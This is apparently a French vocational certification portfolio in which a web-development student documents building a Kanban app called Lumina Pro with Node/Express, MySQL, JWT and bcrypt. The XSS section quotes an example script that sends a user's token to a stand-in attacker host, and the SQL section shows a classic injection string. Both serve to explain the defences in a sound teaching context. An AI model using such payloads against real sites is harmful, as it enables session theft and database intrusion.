# DOSSIER PROFESSIONNEL (DP)
## À copier/adapter dans le formulaire officiel

---

**Nom de naissance :** Ben Hassine
**Prénom :** Syrine
**Adresse :** *(à compléter)*
**Titre professionnel visé :** Développeur Web et Web Mobile
**Modalité d'accès :** ☒ Parcours de formation

---

## SOMMAIRE

**Activité-type n° 1**
*Développer la partie front-end d'une application web ou web mobile en intégrant les recommandations de sécurité*

- Exemple n° 1 — Réaliser une interface utilisateur web statique et adaptable : intégration responsive du tableau Kanban Lumina Pro
- Exemple n° 2 — Développer une interface utilisateur web dynamique : affichage du tableau Kanban en JavaScript avec Fetch et manipulation du DOM
- Exemple n° 3 — Protéger l'interface contre les failles XSS et gérer l'authentification côté client

**Activité-type n° 2**
*Développer la partie back-end d'une application web ou web mobile en intégrant les recommandations de sécurité*

- Exemple n° 1 — Créer une base de données relationnelle MySQL et mettre en place les requêtes CRUD
- Exemple n° 2 — Développer une API REST avec Node.js/Express pour gérer les tâches Kanban
- Exemple n° 3 — Sécuriser le back-end : authentification JWT, hachage bcrypt, requêtes préparées

---
---

## ACTIVITÉ-TYPE N° 1
### Développer la partie front-end d'une application web ou web mobile en intégrant les recommandations de sécurité

---

### EXEMPLE N° 1
**Réaliser une interface utilisateur web statique et adaptable : intégration responsive du tableau Kanban Lumina Pro**

---

**1. Décrivez les tâches ou opérations que vous avez effectuées, et dans quelles conditions :**

Dans le cadre du projet Lumina Pro, j'ai réalisé l'intégration complète de l'interface utilisateur en HTML et CSS, en veillant à ce qu'elle soit accessible sur tous types d'écrans (ordinateur, tablette, mobile).

L'interface se compose de deux pages principales : une page d'authentification (`login.html`) et un tableau de bord Kanban (`index.html`). Pour structurer le projet, j'ai divisé la feuille de style en plusieurs modules CSS importés depuis un fichier principal (`style.css`) : variables, mise en page, kanban, composants, formulaires/modales, authentification et responsive.

Pour le tableau Kanban, j'ai utilisé **CSS Flexbox** pour aligner les colonnes horizontalement et permettre le défilement horizontal sur petits écrans :

```css
/* css/kanban.css */
.kanban-board {
    display: flex;
    gap: 20px;
    overflow-x: auto;
    padding: 20px;
}
.kanban-column {
    min-width: 280px;
    flex: 0 0 auto;
}
```

Pour le responsive, j'ai mis en place des **media queries** dans le fichier `css/responsive.css` afin d'adapter la mise en page selon la largeur d'écran. Sur mobile, la barre latérale est masquée par défaut et un bouton hamburger permet de la faire apparaître :

```css
@media (max-width: 900px) {
    .sidebar {
        transform: translateX(-100%);
        transition: transform 0.3s ease;
    }
    .sidebar.open {
        transform: translateX(0);
    }
    .sidebar-toggle {
        display: block;
    }
}
```

Le basculement du menu est géré en JavaScript avec `classList.toggle('open')` sur l'élément `.sidebar`.

J'ai également défini des **variables CSS** dans `css/variables.css` pour centraliser les couleurs, polices et espacements du projet, facilitant la maintenance et la cohérence visuelle :

```css
:root {
    --primary: #d63384;
    --danger: #ff006e;
    --text-muted: #6c757d;
    --border: rgba(255,255,255,0.1);
}
```

La page de connexion dispose d'un **sélecteur de thème** (clair/sombre) dont l'état est persisté dans le `localStorage` et appliqué immédiatement au chargement grâce à un script inline dans `<head>`.

---

**2. Précisez les moyens utilisés :**

- HTML5 sémantique (balises `<nav>`, `<main>`, `<header>`, `<form>`)
- CSS3 : Flexbox, variables CSS, media queries, transitions
- JavaScript vanilla pour le toggle de la sidebar et du thème
- Police Google Fonts (Inter : poids 400, 600, 700, 900)
- VS Code avec extensions Live Server
- Outils de développement Chrome/Firefox (DevTools — vue responsive)
- Git/GitHub pour le versionnage

---

**3. Avec qui avez-vous travaillé ?**

J'ai travaillé seule sur l'intégration front-end de ce projet.

---

**4. Contexte**

- **Nom de l'organisme :** La Plateforme_
- **Période d'exercice :** Du *(date de début)* au *(date de soutenance)*

---

**5. Informations complémentaires (facultatif)**

Le projet est versionné sur GitHub. Le repository contient l'ensemble des fichiers front-end et back-end avec un historique de commits régulier.

---
---

### EXEMPLE N° 2
**Développer une interface utilisateur web dynamique : affichage du tableau Kanban en JavaScript avec Fetch et manipulation du DOM**

---

**1. Décrivez les tâches ou opérations que vous avez effectuées, et dans quelles conditions :**

Le tableau Kanban de Lumina Pro est entièrement généré en JavaScript de manière dynamique à partir des données récupérées via l'API REST du serveur. Aucune donnée n'est codée en dur dans le HTML.

Au chargement de la page (`DOMContentLoaded`), la fonction `fetchTasks()` effectue deux requêtes HTTP asynchrones successives : l'une pour récupérer les colonnes, l'autre pour les tâches.

```javascript
// js/kanban.js
async function fetchTasks() {
    try {
        const resCol = await authFetch('http://localhost:3000/api/columns');
        const columns = await resCol.json();

        const resTasks = await authFetch('http://localhost:3000/api/tasks');
        const tasks = await resTasks.json();

        renderBoard(columns, tasks);
    } catch (e) {
        board.innerHTML = "<p style='color:red;'>Impossible de se connecter au serveur.</p>";
    }
}
```

L'utilisation de `async/await` permet de gérer l'asynchronisme de façon lisible. Le bloc `try/catch` assure qu'une erreur réseau (serveur éteint, timeout) est interceptée proprement et affiche un message à l'utilisateur.

La fonction `renderBoard(columns, tasks)` construit ensuite le HTML du tableau. Pour chaque colonne, elle filtre les tâches correspondantes avec `.filter()`, puis les convertit en HTML avec `.map()` et `.join('')` :

```javascript
function renderBoard(columns, tasks) {
    columns.forEach((col, index) => {
        const prevCol = index > 0 ? columns[index - 1] : null;
        const nextCol = index < columns.length - 1 ? columns[index + 1] : null;
        const colTasks = tasks.filter(t => t.id_col === col.id);

        const colEl = document.createElement('div');
        colEl.className = 'kanban-column';
        colEl.innerHTML = `
            <h4>${col.title.toUpperCase()}
                <span class="badge">${colTasks.length}</span>
            </h4>
            <div class="task-list">
                ${colTasks.map(task => `
                    <div class="task-card">
                        <h5>${escapeHTML(task.title)}</h5>
                        <p>${escapeHTML(task.description || '')}</p>
                        <div class="assigned-to">👤 ${escapeHTML(task.assigned_name || 'Non assigné')}</div>
                        <span onclick="moveTask(${task.id}, ${prevCol ? prevCol.id : ''})">⬅️</span>
                        <span onclick="moveTask(${task.id}, ${nextCol ? nextCol.id : ''})">➡️</span>
                    </div>
                `).join('')}
            </div>
        `;
        board.appendChild(colEl);
    });
}
```

Le déplacement d'une tâche entre colonnes est réalisé par la fonction `moveTask()` qui envoie une requête `PUT` avec uniquement l'identifiant de la nouvelle colonne :

```javascript
async function moveTask(taskId, newColId) {
    await authFetch(`http://localhost:3000/api/tasks/${taskId}`, {
        method: 'PUT',
        body: JSON.stringify({ id_col: newColId })
    });
    fetchTasks(); // Rafraîchit l'affichage
}
```

La modale de création/modification de tâche est gérée entièrement en JavaScript : ouverture, fermeture, réinitialisation du formulaire, et soumission via `handleTaskSubmit()` qui détermine dynamiquement si la requête doit être un POST (création) ou un PUT (modification) selon la présence d'un ID.

---

**2. Précisez les moyens utilisés :**

- JavaScript ES6+ : `async/await`, Promises, Template literals, `.forEach()`, `.filter()`, `.map()`, `.join()`
- API Fetch native du navigateur
- Manipulation du DOM : `createElement`, `innerHTML`, `classList`, `style.display`
- `localStorage` pour la lecture du token JWT et des données utilisateur
- Architecture modulaire : 7 fichiers JS séparés par responsabilité (`api.js`, `auth.js`, `kanban.js`, `tasks.js`, `columns.js`, `ui.js`, `team.js`, `profile.js`)

---

**3. Avec qui avez-vous travaillé ?**

J'ai travaillé seule sur le développement front-end dynamique.

---

**4. Contexte**

- **Nom de l'organisme :** La Plateforme_
- **Période d'exercice :** Du *(date)* au *(date)*

---

**5. Informations complémentaires (facultatif)**

L'application est accessible localement via XAMPP (Apache + MySQL) pour le front-end servi statiquement, et Node.js sur le port 3000 pour l'API.

---
---

### EXEMPLE N° 3
**Protéger l'interface contre les failles XSS et gérer l'authentification côté client avec JWT**

---

**1. Décrivez les tâches ou opérations que vous avez effectuées, et dans quelles conditions :**

Consciente des risques de sécurité liés aux applications web, j'ai intégré plusieurs mécanismes de protection côté front-end dans Lumina Pro.

**Protection XSS (Cross-Site Scripting) :**
Toutes les données issues de la base de données et affichées dans le DOM sont systématiquement nettoyées par la fonction `escapeHTML()` définie dans `js/api.js` :

```javascript
function escapeHTML(str) {
    if (!str) return '';
    return str.toString()
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}
```

Sans cette protection, un utilisateur malveillant pourrait créer une tâche dont le titre serait `<script>document.location='http://pirate.com?c='+localStorage.getItem('token')</script>`. Ce script s'exécuterait dans le navigateur de tous les visiteurs et volerait leurs tokens JWT.

**Gestion de l'authentification JWT côté client :**
À la connexion, le serveur renvoie un token JWT qui est stocké dans le `localStorage`. La fonction `authFetch()` centralise l'ajout automatique de ce token dans le header `Authorization` de chaque requête sécurisée :

```javascript
async function authFetch(url, options = {}) {
    const token = localStorage.getItem('token');
    if (!options.headers) options.headers = {};
    if (token) {
        options.headers['Authorization'] = `Bearer ${token}`;
    }
    const response = await fetch(url, options);
    if (response.status === 401) {
        localStorage.clear();
        window.location.href = 'login.html';
        throw new Error("Session expirée.");
    }
    return response;
}
```

Si le serveur retourne une erreur `401 Unauthorized` (token expiré ou absent), le `localStorage` est vidé et l'utilisateur est redirigé vers la page de connexion.

**Contrôle d'accès front-end (UX) :**
Dès le chargement du dashboard, une vérification vérifie la présence du token. En l'absence de token, la redirection vers `login.html` est immédiate. L'onglet "Équipe" n'est affiché dans la navigation que pour les utilisateurs ayant le rôle `admin`, lu depuis les données stockées dans le `localStorage` au moment de la connexion.

*Note importante :* Ces protections côté client améliorent l'expérience utilisateur mais ne remplacent pas la sécurité serveur. La vraie vérification des droits est effectuée par le middleware `verifyToken` côté backend.

---

**2. Précisez les moyens utilisés :**

- JavaScript vanilla : fonctions `escapeHTML`, `authFetch`, `DOMContentLoaded`
- API `localStorage` du navigateur (HTML5 Web Storage)
- Protocole JWT (JSON Web Token) pour la gestion de session sans cookie
- Codes HTTP : 200, 201, 401, 403, 500
- Outils de développement navigateur pour tester les attaques XSS

---

**3. Avec qui avez-vous travaillé ?**

J'ai travaillé seule.

---

**4. Contexte**

- **Nom de l'organisme :** La Plateforme_
- **Période d'exercice :** Du *(date)* au *(date)*

---
---

## ACTIVITÉ-TYPE N° 2
### Développer la partie back-end d'une application web ou web mobile en intégrant les recommandations de sécurité

---

### EXEMPLE N° 1
**Créer une base de données relationnelle MySQL : conception et mise en place du schéma de Lumina Pro**

---

**1. Décrivez les tâches ou opérations que vous avez effectuées, et dans quelles conditions :**

J'ai conçu et créé la base de données MySQL de Lumina Pro à partir d'une analyse des besoins fonctionnels de l'application.

La base se compose de 5 tables : `users`, `columns`, `tasks`, `logs` et `notifications`.

**Conception du schéma :**

La table `tasks` est au cœur du système. Elle possède deux clés étrangères :
- `id_assigned` → référence `users(id)` avec `ON DELETE SET NULL` : si un utilisateur est supprimé, ses tâches restent mais ne sont plus assignées
- `id_col` → référence `columns(id)` avec `ON DELETE CASCADE` : si une colonne est supprimée, toutes ses tâches sont automatiquement supprimées

```sql
CREATE TABLE IF NOT EXISTS tasks (
    id INT AUTO_INCREMENT PRIMARY KEY,
    title VARCHAR(255) NOT NULL,
    description TEXT,
    priority ENUM('high', 'medium', 'low') DEFAULT 'medium',
    id_assigned INT,
    id_col INT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (id_assigned) REFERENCES users(id) ON DELETE SET NULL,
    FOREIGN KEY (id_col) REFERENCES columns(id) ON DELETE CASCADE
);
```

La colonne `position` dans la table `columns` permet d'assurer un ordre d'affichage stable de gauche à droite (À faire, En cours, Terminé).

La table `users` stocke le mot de passe haché (jamais en clair) et utilise une contrainte `UNIQUE` sur l'email pour éviter les doublons de comptes.

**Initialisation automatique :**
Dans `server.js`, au démarrage du serveur, un mécanisme vérifie si les tables existent (avec `IF NOT EXISTS`) et insère les 3 colonnes par défaut si la table `columns` est vide :

```javascript
db.query("SELECT COUNT(*) as count FROM columns", (err, result) => {
    if (!err && result[0].count === 0) {
        db.query("INSERT INTO columns (title, position) VALUES ('À faire', 1), ('En cours', 2), ('Terminé', 3)");
    }
});
```

**Requêtes SQL du CRUD tasks :**
```sql
-- Lire (avec jointure pour le nom de l'assigné)
SELECT tasks.*, users.name as assigned_name
FROM tasks LEFT JOIN users ON tasks.id_assigned = users.id
ORDER BY id_col ASC, created_at DESC;

-- Créer
INSERT INTO tasks (title, description, priority, id_col, id_assigned)
VALUES (?, ?, ?, ?, ?);

-- Modifier
UPDATE tasks SET title = ?, priority = ?, id_col = ? WHERE id = ?;

-- Supprimer
DELETE FROM tasks WHERE id = ?;
```

---

**2. Précisez les moyens utilisés :**

- MySQL 8 / PhpMyAdmin (XAMPP)
- SQL : `CREATE TABLE`, `INSERT`, `SELECT`, `UPDATE`, `DELETE`, `LEFT JOIN`, `FOREIGN KEY`, `ON DELETE CASCADE/SET NULL`, `AUTO_INCREMENT`, `ENUM`, `TIMESTAMP`
- Node.js avec le driver `mysql2` pour la connexion à la BDD
- `schema.sql` : fichier de création de la base versionnée sur Git

---

**3. Avec qui avez-vous travaillé ?**

J'ai travaillé seule.

---

**4. Contexte**

- **Nom de l'organisme :** La Plateforme_
- **Période d'exercice :** Du *(date)* au *(date)*

---
---

### EXEMPLE N° 2
**Développer une API REST avec Node.js/Express pour gérer le cycle de vie des tâches Kanban**

---

**1. Décrivez les tâches ou opérations que vous avez effectuées, et dans quelles conditions :**

J'ai développé le serveur back-end de Lumina Pro avec **Node.js** et le framework **Express**. Il expose une API REST consommée par le front-end via des requêtes `fetch()`.

**Architecture du serveur (`server.js`) :**
Le serveur configure dans l'ordre : CORS, parser JSON, connexion MySQL, middleware d'injection de `db`, puis les routes. Les routes publiques (`/api/auth`) ne nécessitent pas de token ; les routes protégées (`/api/tasks`, `/api/columns`, `/api/users`) passent d'abord par le middleware `verifyToken`.

```javascript
app.use(cors());
app.use(express.json());
app.use((req, res, next) => { req.db = db; next(); });

app.use('/api/auth', require('./routes/auth'));
app.use('/api/tasks', verifyToken, require('./routes/tasks'));
app.use('/api/columns', verifyToken, require('./routes/columns'));
app.use('/api/users', verifyToken, require('./routes/users'));
```

**Route GET `/api/tasks` :**
Utilise un `LEFT JOIN` pour récupérer le nom de l'utilisateur assigné à chaque tâche. Un `INNER JOIN` aurait exclu les tâches non assignées.

**Route POST `/api/tasks` :**
Si le client ne précise pas de colonne, le serveur cherche automatiquement la première colonne (`ORDER BY position ASC LIMIT 1`).

**Route PUT `/api/tasks/:id` — requête dynamique :**
Permet de modifier n'importe quelle combinaison de champs (déplacement d'une tâche = seulement `id_col`, édition complète = titre + description + priorité). La requête SQL est construite dynamiquement :

```javascript
let sql = "UPDATE tasks SET ";
let params = [];
if (title)                   { sql += "title = ?, "; params.push(title); }
if (description !== undefined) { sql += "description = ?, "; params.push(description); }
if (id_col)                  { sql += "id_col = ?, "; params.push(id_col); }
sql = sql.slice(0, -2) + " WHERE id = ?";
params.push(taskId);
```

**Audit trail (traçabilité) :**
Chaque création, modification et suppression de tâche ou de colonne insère une ligne dans la table `logs` pour garder un historique des actions.

**Documentation Swagger :**
L'API est documentée via `swagger.json` et accessible à l'adresse `http://localhost:3000/api-docs`. Elle liste tous les endpoints, les paramètres attendus et les réponses possibles.

---

**2. Précisez les moyens utilisés :**

- Node.js (runtime JavaScript serveur)
- Express 5 (framework web)
- `mysql2` (driver MySQL pour Node.js)
- `cors` (middleware Cross-Origin Resource Sharing)
- `jsonwebtoken` (génération et vérification des tokens JWT)
- `bcrypt` (hachage des mots de passe)
- `swagger-ui-express` + `swagger.json` (documentation API)
- Postman (tests des endpoints)
- Méthodes HTTP : GET, POST, PUT, DELETE
- Codes de statut : 200, 201, 400, 401, 403, 500

---

**3. Avec qui avez-vous travaillé ?**

J'ai travaillé seule.

---

**4. Contexte**

- **Nom de l'organisme :** La Plateforme_
- **Période d'exercice :** Du *(date)* au *(date)*

---

**5. Informations complémentaires (facultatif)**

La documentation Swagger est accessible en local sur `http://localhost:3000/api-docs` et permet de tester l'API directement depuis le navigateur.

---
---

### EXEMPLE N° 3
**Sécuriser le back-end : authentification JWT, hachage bcrypt, requêtes préparées anti-injection SQL**

---

**1. Décrivez les tâches ou opérations que vous avez effectuées, et dans quelles conditions :**

La sécurité du back-end de Lumina Pro repose sur trois mécanismes principaux que j'ai mis en place.

**1 — Hachage des mots de passe avec bcrypt**

Les mots de passe ne sont jamais stockés en clair en base de données. À l'inscription, `bcrypt.hash()` génère un sel aléatoire et hache le mot de passe avec un coût algorithmique de 10 rounds :

```javascript
const hashedPassword = await bcrypt.hash(password, 10);
// Résultat : "$2b$10$N9qo8uLOickgx2ZMRZo..." (72 caractères)
```

À la connexion, `bcrypt.compare()` permet de vérifier le mot de passe saisi sans jamais déchiffrer le hash (irréversible) :

```javascript
const isMatch = await bcrypt.compare(password, user.password);
// true si correspond, false sinon
```

*Différence hash/chiffrement :* Le hachage est irréversible (on ne peut pas retrouver le mot de passe original). Le chiffrement est réversible avec une clé. On hache les mots de passe précisément parce qu'on n'a pas besoin de les relire, seulement de les comparer.

**2 — Authentification par token JWT (middleware `verifyToken`)**

Toutes les routes protégées passent par le middleware `middleware/security.js` avant d'être exécutées. Il extrait le token du header `Authorization: Bearer <token>`, le vérifie avec `jwt.verify()` et injecte les données décodées dans `req.user` :

```javascript
function verifyToken(req, res, next) {
    const authHeader = req.headers['authorization'];
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({ error: "Token manquant." });
    }
    const token = authHeader.split(' ')[1];
    try {
        const decoded = jwt.verify(token, SECRET_KEY);
        req.user = decoded; // { id: 1, role: 'admin' }
        next();
    } catch (error) {
        return res.status(403).json({ error: "Token invalide ou expiré." });
    }
}
```

Le token expire après 24h (`expiresIn: '24h'`), limitant les risques en cas de vol.

**3 — Requêtes préparées contre l'injection SQL**

Toutes les requêtes SQL utilisant des données utilisateur emploient des placeholders `?` et passent les valeurs dans un tableau séparé. Le driver `mysql2` échappe automatiquement les valeurs :

```javascript
// SÉCURISÉ : requête préparée
const sql = "SELECT * FROM users WHERE email = ?";
req.db.query(sql, [email], callback);

// DANGEREUX (non utilisé) : concaténation directe
const sql = "SELECT * FROM users WHERE email = '" + email + "'";
// → risque d'injection : email = "' OR '1'='1"
```

En plus, la route `GET /api/users` ne sélectionne jamais le champ `password` (même haché), pour éviter toute exposition :

```javascript
const sql = "SELECT id, name, email, role FROM users";
// Jamais SELECT * FROM users
```

---

**2. Précisez les moyens utilisés :**

- `bcrypt` v6 (algorithme Blowfish, saltRounds = 10)
- `jsonwebtoken` v9 (algorithme HS256, expiration 24h)
- Requêtes préparées avec placeholders `?` (driver mysql2)
- Architecture middleware Express (chaîne `verifyToken` → route)
- Codes HTTP sémantiques : 401 (non authentifié), 403 (interdit), 500 (erreur serveur)

---

**3. Avec qui avez-vous travaillé ?**

J'ai travaillé seule.

---

**4. Contexte**

- **Nom de l'organisme :** La Plateforme_
- **Période d'exercice :** Du *(date)* au *(date)*

---

**5. Informations complémentaires (facultatif)**

Note sur l'amélioration possible : la clé secrète JWT (`SECRET_KEY`) est actuellement codée en dur dans le fichier source. En production, elle devrait être stockée dans un fichier `.env` non versionné (jamais committé sur Git) et chargée via la bibliothèque `dotenv`.

---
---

## DÉCLARATION SUR L'HONNEUR

Je soussignée **Syrine Ben Hassine**, déclare sur l'honneur que les renseignements fournis dans ce dossier sont exacts et que je suis l'auteure des réalisations jointes.

Fait à *(ville)* le *(date)*

*Signature :*

---

## DOCUMENTS ILLUSTRANT LA PRATIQUE PROFESSIONNELLE

- Code source complet : repository GitHub `lumina-pro`
- Captures d'écran de l'application en version desktop et mobile
- Documentation API Swagger (`swagger.json`)
- Schéma de base de données (`database/schema.sql`)
